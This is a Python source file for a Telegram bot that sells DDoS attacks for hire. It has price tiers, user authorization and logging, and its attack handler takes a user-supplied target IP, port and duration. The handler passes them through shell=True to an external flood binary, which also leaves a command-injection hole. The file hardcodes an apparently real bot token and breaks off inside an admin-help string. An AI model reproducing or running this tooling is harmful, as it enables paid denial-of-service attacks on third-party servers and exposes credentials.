import telebot
import subprocess
import requests
import datetime
import os
import threading
import time
import logging
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
from telebot import types
import http.server
import socketserver

from keep_alive import keep_alive
keep_alive()
# Insert your Telegram bot token here
bot = telebot.TeleBot('7853841048:AAFprh6fbdzf7qFWlf1F_T4ZI4kA8AMCbXE')

# Admin user IDs
admin_id = ["5926435353"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found тЭМ."
            else:
                file.truncate(0)
                response = "Logs cleared successfully тЬЕ"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")


def create_start_keyboard(language):
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    if language == 'EN':
        Attack_button = KeyboardButton('тЪФя╕П START ATTACK тЪФя╕П')
        plan_button = KeyboardButton('BUY PLAN ЁЯЫТ')
        rules_button = KeyboardButton('RULES тД╣я╕П')
        mylogs_button = KeyboardButton('MY LOGS ЁЯУЭ')
        help_button = KeyboardButton('HELP тЭУ')
        id_button = KeyboardButton('ID ЁЯЖФ')
    else:
        Attack_button = KeyboardButton('тЪФя╕П рд╣рдорд▓рд╛ рд╢реБрд░реВ рдХрд░реЗрдВ тЪФя╕П')
        plan_button = KeyboardButton('рдпреЛрдЬрдирд╛ рдЦрд░реАрджреЗрдВ ЁЯЫТ')
        rules_button = KeyboardButton('рдирд┐рдпрдо тД╣я╕П')
        mylogs_button = KeyboardButton('рдореЗрд░реЗ рд▓реЙрдЧреНрд╕ ЁЯУЭ')
        help_button = KeyboardButton('рдорджрдж тЭУ')
        id_button = KeyboardButton('рдЖрдИрдбреА ЁЯЖФ')

    keyboard.add(Attack_button)
    keyboard.row(rules_button, mylogs_button)
    keyboard.row(help_button, id_button)
    keyboard.add(plan_button)
    return keyboard

# Function to create the start keyboard for admin users
def create_admin_keyboard(language):
    keyboard = create_start_keyboard(language)
    if language == 'EN':
        Add_button = KeyboardButton('ADD NEW USER ЁЯЖХ')
        remove_button = KeyboardButton('REMOVE USER ЁЯУЫ')
        allusers_button = KeyboardButton('ALL USERS ЁЯСе')
        logs_button = KeyboardButton('LOGS ЁЯУК')
        clearlogs_button = KeyboardButton('CLEAR LOGS ЁЯЧСя╕П')
        admincmd_button = KeyboardButton('ADMIN CMD тЪЩя╕П')
        Broadcast_button = KeyboardButton('BROADCAST ЁЯУв')
    else:
        Add_button = KeyboardButton('рдирдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬреЛрдбрд╝реЗрдВ ЁЯЖХ')
        remove_button = KeyboardButton('рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рдХрд╛рд▓реЗрдВ ЁЯУЫ')
        allusers_button = KeyboardButton('рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ ЁЯСе')
        logs_button = KeyboardButton('рд▓реЙрдЧреНрд╕ ЁЯУК')
        clearlogs_button = KeyboardButton('рд▓реЙрдЧреНрд╕ рд╕рд╛рдл рдХрд░реЗрдВ ЁЯЧСя╕П')
        admincmd_button = KeyboardButton('рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЖрджреЗрд╢ тЪЩя╕П')
        Broadcast_button = KeyboardButton('рдкреНрд░рд╕рд╛рд░рдг ЁЯУв')

    keyboard.add(KeyboardButton('ЁЯСС  --- ADMIN COMMANDS ---  ЁЯСС'))
    keyboard.row(Add_button, remove_button)
    keyboard.row(allusers_button, logs_button)
    keyboard.row(clearlogs_button, admincmd_button)
    keyboard.add(Broadcast_button)
    return keyboard

# Store user languages
user_languages = {}

# Handler for the /start command
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = str(message.chat.id)
    # Ask user to select language
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("English", callback_data="lang_EN"))
    markup.add(InlineKeyboardButton("рд╣рд┐рдВрджреА", callback_data="lang_HI"))
    bot.send_message(message.chat.id, "Please select your language / рдХреГрдкрдпрд╛ рдЕрдкрдиреА рднрд╛рд╖рд╛ рдЪреБрдиреЗрдВ:", reply_markup=markup)

# Callback handler for language selection
@bot.callback_query_handler(func=lambda call: call.data.startswith("lang_"))
def set_language(call):
    user_id = str(call.message.chat.id)
    language = call.data.split("_")[1]
    user_languages[user_id] = language
    if language == 'EN':
        response = "ЁЯСЛЁЯП╗Welcome! Feel Free to Explore.\n\nЁЯдЦPlease Follow Rules.\n\nтЬЕJoin :- @smokeymods"
    else:
        response = "ЁЯСЛЁЯП╗рд╕реНрд╡рд╛рдЧрдд рд╣реИ! рдЕрдиреНрд╡реЗрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрд╡рддрдВрддреНрд░ рдорд╣рд╕реВрд╕ рдХрд░реЗрдВред\n\nЁЯдЦрдХреГрдкрдпрд╛ рдирд┐рдпрдореЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВред\n\nтЬЕрдЬреЙрдЗрди рдХрд░реЗрдВ :- @smokeymods"

    if user_id in admin_id:
        keyboard = create_admin_keyboard(language)
    else:
        keyboard = create_start_keyboard(language)

    bot.send_message(call.message.chat.id, response, reply_markup=keyboard)


#-----------------------------------------

@bot.message_handler(func=lambda message: message.text in ['ADD NEW USER ЁЯЖХ', 'рдирдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬреЛрдбрд╝реЗрдВ ЁЯЖХ'])
def add_new_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            msg = bot.send_message(message.chat.id, "Please enter the user ID to authorize:")
        else:
            msg = bot.send_message(message.chat.id, "рдХреГрдкрдпрд╛ рдЕрдзрд┐рдХреГрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА рджрд░реНрдЬ рдХрд░реЗрдВ:")
        bot.register_next_step_handler(msg, process_new_user)
    else:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "тЭМ You are not authorized to add new users."
        else:
            response = "тЭМ рдЖрдкрдХреЛ рдирдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рд╣реИред"
        bot.send_message(message.chat.id, response)

def process_new_user(message):
    user_id = str(message.chat.id)
    new_user_id = message.text
    if new_user_id in allowed_user_ids:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "User is already authorized."
        else:
            response = "рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЕрдзрд┐рдХреГрдд рд╣реИред"
        bot.send_message(message.chat.id, response)
    else:
        allowed_user_ids.append(new_user_id)
        with open(USER_FILE, "a") as file:
            file.write(new_user_id + "\n")
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "User authorized successfully."
        else:
            response = "рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдЕрдзрд┐рдХреГрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ред"
        bot.send_message(message.chat.id, response)

#-----------------------------------------

@bot.message_handler(func=lambda message: message.text in ['REMOVE USER ЁЯУЫ', 'рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рдХрд╛рд▓реЗрдВ ЁЯУЫ'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            msg = bot.send_message(message.chat.id, "Please enter the user ID to remove:")
        else:
            msg = bot.send_message(message.chat.id, "рдХреГрдкрдпрд╛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА рджрд░реНрдЬ рдХрд░реЗрдВ:")
        bot.register_next_step_handler(msg, process_remove_user)
    else:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "тЭМ You are not authorized to remove users."
        else:
            response = "тЭМ рдЖрдкрдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рд╣реИред"
        bot.send_message(message.chat.id, response)

def process_remove_user(message):
    user_id = str(message.chat.id)
    remove_user_id = message.text
    if remove_user_id in allowed_user_ids:
        allowed_user_ids.remove(remove_user_id)
        with open(USER_FILE, "w") as file:
            file.write("\n".join(allowed_user_ids))
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "User removed successfully."
        else:
            response = "рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдирд┐рдХрд╛рд▓рд╛ рдЧрдпрд╛ред"
    else:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "User ID not found."
        else:
            response = "рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА рдирд╣реАрдВ рдорд┐рд▓реАред"
    bot.send_message(message.chat.id, response)        

#-----------------------------------------------------


@bot.message_handler(func=lambda message: message.text in ['BROADCAST ЁЯУв', 'рдкреНрд░рд╕рд╛рд░рдг ЁЯУв'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Click Hear To Enter", callback_data="enter_broadcast_message"))
        bot.send_message(message.chat.id, "Click the button to enter the broadcast message:", reply_markup=markup)
    else:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "Only Admin Can Run This Command ЁЯШб."
        else:
            response = "рдХреЗрд╡рд▓ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЗрд╕ рдХрдорд╛рдВрдб рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ ЁЯШб."
        bot.reply_to(message, response)

@bot.callback_query_handler(func=lambda call: call.data == "enter_broadcast_message")
def handle_broadcast_message_input(call):
    user_id = str(call.message.chat.id)
    if user_id in admin_id:
        msg = bot.send_message(call.message.chat.id, "Please enter the broadcast message:")
        bot.register_next_step_handler(msg, process_broadcast_message)
    else:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "Only Admin Can Run This Command ЁЯШб."
        else:
            response = "рдХреЗрд╡рд▓ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЗрд╕ рдХрдорд╛рдВрдб рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ ЁЯШб."
        bot.reply_to(call.message, response)

def process_broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        broadcast_msg = message.text
        message_to_broadcast = "тЪая╕П Message To All Users By Admin:\n\n" + broadcast_msg
        with open(USER_FILE, "r") as file:
            user_ids = file.read().splitlines()
            for user_id in user_ids:
                try:
                    bot.send_message(user_id, message_to_broadcast)
                except Exception as e:
                    print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "Broadcast Message Sent Successfully To All Users ЁЯСН."
        else:
            response = "рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдкреНрд░рд╕рд╛рд░рд┐рдд рд╕рдВрджреЗрд╢ ЁЯСНред"
        bot.reply_to(message, response)
    else:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "Only Admin Can Run This Command ЁЯШб."
        else:
            response = "рдХреЗрд╡рд▓ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЗрд╕ рдХрдорд╛рдВрдб рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ ЁЯШб."
        bot.reply_to(message, response)


#----------------------------------------------------

@bot.message_handler(func=lambda message: message.text in ['CLEAR LOGS ЁЯЧСя╕П', 'рд▓реЙрдЧреНрд╕ рд╕рд╛рдл рдХрд░реЗрдВ ЁЯЧСя╕П'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "Only Admin Can Run This Command ЁЯШб."
        else:
            response = "рдХреЗрд╡рд▓ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЗрд╕ рдХрдорд╛рдВрдб рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ ЁЯШб."
    bot.reply_to(message, response)

#--------------------------------------------------

@bot.message_handler(func=lambda message: message.text in ['ALL USERS ЁЯСе', 'рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ ЁЯСе'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response_en = "Authorized Users:\n"
                    response_hi = "рдЕрдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response_en += f"- @{username} (ID: {user_id})\n"
                            response_hi += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response_en += f"- User ID: {user_id}\n"
                            response_hi += f"- User ID: {user_id}\n"
                else:
                    response_en = "No data found тЭМ"
                    response_hi = "рдХреЛрдИ рдбреЗрдЯрд╛ рдирд╣реАрдВ рдорд┐рд▓рд╛ тЭМ"
        except FileNotFoundError:
            response_en = "No data found тЭМ"
            response_hi = "рдХреЛрдИ рдбреЗрдЯрд╛ рдирд╣реАрдВ рдорд┐рд▓рд╛ тЭМ"
    else:
        response_en = "Only Admin Can Run This Command ЁЯШб."
        response_hi = "рдХреЗрд╡рд▓ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЗрд╕ рдХрдорд╛рдВрдб рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ ЁЯШб."
    
    language = user_languages.get(user_id, 'EN')
    if language == 'EN':
        bot.reply_to(message, response_en)
    else:
        bot.reply_to(message, response_hi)



#------------------------------------------------------------------------------    

@bot.message_handler(func=lambda message: message.text in ['LOGS ЁЯУК', 'рд▓реЙрдЧреНрд╕ ЁЯУК'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                language = user_languages.get(user_id, 'EN')
                if language == 'EN':
                    response = "No data found тЭМ."
                else:
                    response = "рдХреЛрдИ рдбреЗрдЯрд╛ рдирд╣реАрдВ рдорд┐рд▓рд╛ тЭМ."
                bot.reply_to(message, response)
        else:
            language = user_languages.get(user_id, 'EN')
            if language == 'EN':
                response = "No data found тЭМ"
            else:
                response = "рдХреЛрдИ рдбреЗрдЯрд╛ рдирд╣реАрдВ рдорд┐рд▓рд╛ тЭМ"
            bot.reply_to(message, response)
    else:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "Only Admin Can Run This Command ЁЯШб."
        else:
            response = "рдХреЗрд╡рд▓ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЗрд╕ рдХрдорд╛рдВрдб рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ ЁЯШб."
        bot.reply_to(message, response)


#-----------------------------------------------------        

@bot.message_handler(func=lambda message: message.text in ['ID ЁЯЖФ', 'рдЖрдИрдбреА ЁЯЖФ'])
def id_command(message):
    user_id = str(message.chat.id)
    language = user_languages.get(user_id, 'EN')

    if language == 'EN':
        response = f"Your user ID is: {user_id}"
    else:
        response = f"рдЖрдкрдХреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА рд╣реИ: {user_id}"

    bot.send_message(message.chat.id, response)

#--------------------------------------------------------------------------------    

# Function to handle the reply when users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    response = f"{username}, ЁЭРАЁЭРУЁЭРУЁЭРАЁЭРВЁЭРК ЁЭРТЁЭРУЁЭРАЁЭРСЁЭРУЁЭРДЁЭРГ.ЁЯФеЁЯФе\n\nЁЭРУЁЭРЪЁЭРлЁЭРаЁЭРЮЁЭРн: {target}\nЁЭРПЁЭРиЁЭРлЁЭРн: {port}\nЁЭРУЁЭРвЁЭРжЁЭРЮ: {time} ЁЭРТЁЭРЮЁЭРЬЁЭРиЁЭРзЁЭРЭЁЭРм\nЁЭРМЁЭРЮЁЭРнЁЭРбЁЭРиЁЭРЭ: BGMI"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}
COOLDOWN_TIME = 0

# Dictionary to store the state for each user during /bgmi command input
bgmi_state = {}

@bot.message_handler(func=lambda message: message.text == 'тЪФя╕П START ATTACK тЪФя╕П' or message.text == 'тЪФя╕П рд╣рдорд▓рд╛ рд╢реБрд░реВ рдХрд░реЗрдВ тЪФя╕П')
def start_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        bgmi_state[user_id] = {'step': 'target'}
        msg = bot.send_message(message.chat.id, "Enter the target IP:")
        bot.register_next_step_handler(msg, process_bgmi_target)
    else:
        response = "тЭМ You Are Not Authorized To Use This Command please purchase to use."
        bot.reply_to(message, response)

def process_bgmi_target(message):
    user_id = str(message.chat.id)
    if user_id in bgmi_state:
        bgmi_state[user_id]['target'] = message.text
        bgmi_state[user_id]['step'] = 'port'
        msg = bot.send_message(message.chat.id, "Enter the port:")
        bot.register_next_step_handler(msg, process_bgmi_port)

def process_bgmi_port(message):
    user_id = str(message.chat.id)
    if user_id in bgmi_state:
        bgmi_state[user_id]['port'] = message.text
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(" 30 seconds", callback_data="bgmi_30"))
        markup.add(InlineKeyboardButton(" 60 seconds", callback_data="bgmi_60"))
        markup.add(InlineKeyboardButton("120 seconds", callback_data="bgmi_120"))
        markup.add(InlineKeyboardButton("180 seconds", callback_data="bgmi_180"))
        markup.add(InlineKeyboardButton("  5 minutes", callback_data="bgmi_300"))
        markup.add(InlineKeyboardButton(" 10 minutes", callback_data="bgmi_600"))
        markup.add(InlineKeyboardButton(" 40 minutes", callback_data="bgmi_2400"))
        bot.send_message(message.chat.id, "Choose the attack duration:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data in ["bgmi_30", "bgmi_60" ,"bgmi_120", "bgmi_180", "bgmi_300", "bgmi_600", "bgmi_2400"])
def handle_bgmi_duration(call):
    user_id = str(call.message.chat.id)
    if user_id in bgmi_state:
        duration = int(call.data.split("_")[1])
        target = bgmi_state[user_id]['target']
        port = bgmi_state[user_id]['port']
        del bgmi_state[user_id]  # Clear the state after using it

        if user_id not in admin_id:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "You Are On Cooldown тЭМ. Please Wait 5min Before Running The /bgmi Command Again."
                bot.send_message(call.message.chat.id, response)
                return
            bgmi_cooldown[user_id] = datetime.datetime.now()

        record_command_logs(user_id, '/bgmi', target, port, duration)
        log_command(user_id, target, port, duration)
        start_attack_reply(call.message, target, port, duration)
        full_command = f"./venompapa {target} {port} {duration} 360"
        subprocess.run(full_command, shell=True)
        response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {duration}"
        bot.send_message(call.message.chat.id, response)

#-------------------------------------------------------------------------------------------------        

@bot.message_handler(func=lambda message: message.text in ['MY LOGS ЁЯУЭ', 'рдореЗрд░реЗ рд▓реЙрдЧреНрд╕ ЁЯУЭ'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    language = user_languages.get(user_id, 'EN')
                    if language == 'EN':
                        response = "тЭМ No Command Logs Found For You тЭМ."
                    else:
                        response = "тЭМ рдЖрдкрдХреЗ рд▓рд┐рдП рдХреЛрдИ рдХрдорд╛рдВрдб рд▓реЙрдЧ рдирд╣реАрдВ рдорд┐рд▓рд╛ тЭМ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        language = user_languages.get(user_id, 'EN')
        if language == 'EN':
            response = "You Are Not Authorized To Use This Command ЁЯШб."
        else:
            response = "рдЖрдкрдХреЛ рдЗрд╕ рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдзрд┐рдХреГрддрд┐ рдирд╣реАрдВ рд╣реИ ЁЯШб."
    bot.reply_to(message, response)



#--------------------------------------------------------------


@bot.message_handler(func=lambda message: message.text in ['HELP тЭУ', 'рдорджрдж тЭУ'])
def help_command(message):
    user_id = str(message.chat.id)
    language = user_languages.get(user_id, 'EN')

    if language == 'EN':
        response = "How can I assist you? Here are some commands you can use:\n\n" \
                   "- /start: Restart the bot and select language\n\n" \
                   "- тЪФя╕П START ATTACK тЪФя╕П: Initiate an attack\n" \
                   "- BUY PLAN ЁЯЫТ: Purchase a plan\n" \
                   "- RULES тД╣я╕П: View rules\n" \
                   "- MY LOGS ЁЯУЭ: View your logs\n" \
                   "- ID ЁЯЖФ: Get your user ID\n"\
                   "-ЁЯСиЁЯП╗тАНЁЯТ╗ ADMIN :- @smokeymods"
    else:
        response = "рдореИрдВ рдЖрдкрдХреА рдХреИрд╕реЗ рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реВрдБ? рдпрд╣рд╛рдБ рдХреБрдЫ рдЖрджреЗрд╢ рджрд┐рдП рдЧрдП рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:\n\n" \
                   "- /start: рдмреЙрдЯ рдХреЛ рдкреБрдирдГ рдЖрд░рдВрдн рдХрд░реЗрдВ рдФрд░ рднрд╛рд╖рд╛ рдЪреБрдиреЗрдВ\n" \
                   "- тЪФя╕П рд╣рдорд▓рд╛ рд╢реБрд░реВ рдХрд░реЗрдВ тЪФя╕П: рд╣рдорд▓рд╛ рд╢реБрд░реВ рдХрд░реЗрдВ\n" \
                   "- рдпреЛрдЬрдирд╛ рдЦрд░реАрджреЗрдВ ЁЯЫТ: рдПрдХ рдпреЛрдЬрдирд╛ рдЦрд░реАрджреЗрдВ\n" \
                   "- рдирд┐рдпрдо тД╣я╕П: рдирд┐рдпрдо рджреЗрдЦреЗрдВ\n" \
                   "- рдореЗрд░реЗ рд▓реЙрдЧреНрд╕ ЁЯУЭ: рдЕрдкрдиреЗ рд▓реЙрдЧреНрд╕ рджреЗрдЦреЗрдВ\n" \
                   "- рдЖрдИрдбреА ЁЯЖФ: рдЕрдкрдиреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ\n" \
                   "-ЁЯСиЁЯП╗тАНЁЯТ╗ ADMIN :- @smokeymods"

    bot.send_message(message.chat.id, response)    

  
#---------------------------------------------------

@bot.message_handler(func=lambda message: message.text in ['RULES тД╣я╕П', 'рдирд┐рдпрдо тД╣я╕П'])
def welcome_rules(message):
    user_id = str(message.chat.id)
    language = user_languages.get(user_id, 'EN')
    if language == 'EN':
        response = '''тЪая╕П Please Follow These Rules тЪая╕П:

1. Don't Run Too Many Attacks!! It Can Lead to a Ban From the Bot.
2. Don't Run 2 Attacks At the Same Time. If You Do, You'll Get Banned From the Bot.
3. We Check the Logs Daily, So Please Follow These Rules to Avoid a Ban!'''
    else:
        response = '''тЪая╕П рдХреГрдкрдпрд╛ рдЗрди рдирд┐рдпрдореЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ тЪая╕П:

1. рдмрд╣реБрдд рд╕рд╛рд░реЗ рд╣рдорд▓реЗ рди рдЪрд▓рд╛рдПрдВ!! рдпрд╣ рдмреЙрдЯ рд╕реЗ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╣реЛрдиреЗ рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИред
2. рдПрдХ рд╣реА рд╕рдордп рдореЗрдВ 2 рд╣рдорд▓реЗ рди рдЪрд▓рд╛рдПрдВред рдпрджрд┐ рдЖрдк рдРрд╕рд╛ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдмреЙрдЯ рд╕реЗ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
3. рд╣рдо рд▓реЙрдЧреНрд╕ рдХреА рдирд┐рдпрдорд┐рдд рдЬрд╛рдБрдЪ рдХрд░рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдХреГрдкрдпрд╛ рдкреНрд░рддрд┐рдмрдВрдз рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЗрди рдирд┐рдпрдореЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ!'''
    bot.reply_to(message, response)

@bot.message_handler(func=lambda message: message.text in ['BUY PLAN ЁЯЫТ', 'рдпреЛрдЬрдирд╛ рдЦрд░реАрджреЗрдВ ЁЯЫТ'])
def welcome_plan(message):
    user_id = str(message.chat.id)
    language = user_languages.get(user_id, 'EN')
    if language == 'EN':
        response = '''
ЁЯМЯ VIP Powerful DDoS ЁЯМЯ :

-> Attack Time: 180 (S)
-> After Attack Limit: 5 Min
-> Concurrents Attack: 3

------------------------------
ЁЯТ╕ Price List ЁЯТ╕ :
------------------------------
ЁЯТ▓Day-->100 тВ╣
ЁЯТ▓Week-->400 тВ╣
ЁЯТ▓Month-->800 тВ╣
ЁЯТ▓Season--> 1200 тВ╣

 DM TO BUY @smokeymods
------------------------------
'''
    else:
        response = '''
ЁЯМЯ рд╡реАрдЖрдИрдкреА рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рдбреАрдбреЛрдПрд╕ ЁЯМЯ :

-> рд╣рдорд▓реЗ рдХрд╛ рд╕рдордп: 180 (рд╕реЗрдХрдВрдб)
-> рд╣рдорд▓реЗ рдХреЗ рдмрд╛рдж рд╕реАрдорд╛: 5 рдорд┐рдирдЯ
-> рд╕рдордп рд╕рдВрдЧрдгрди: 3

------------------------------
ЁЯТ╕ рдореВрд▓реНрдп рд╕реВрдЪреА ЁЯТ╕ :
------------------------------
ЁЯТ▓рджрд┐рди-->100 тВ╣
ЁЯТ▓рд╕рдкреНрддрд╛рд╣-->400 тВ╣
ЁЯТ▓рдорд╣реАрдирд╛-->800 тВ╣

 DM TO BUY @smokeymods
------------------------------
'''
    bot.reply_to(message, response)


#------------------------------------------------------------------

@bot.message_handler(func=lambda message: message.text in ['ADMIN CMD тЪЩя╕П', 'рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЖрджреЗрд╢ тЪЩя╕П'])
def admin_commands(message):
    user_id = str(message.chat.id)
    language = user_languages.get(user_id, 'EN')
    if language == 'EN':
        response = '''Admin Commands Are Here!!:

ЁЯТе Add a User.
ЁЯТе Remove a User.
ЁЯТе Authorized Users List.
ЁЯТе All Users Logs.
ЁЯТе Broadcast a Message.
ЁЯТе Clear The Logs File.
'''
    else:
        response = '''рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЖрджреЗрд╢ рдпрд╣рд╛рдБ рд╣реИрдВ!!:

ЁЯТе рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬреЛрдбрд╝реЗрдВред
ЁЯТе рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣рдЯрд╛рдПрдВред
ЁЯТе рдЕрдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реВрдЪреАред
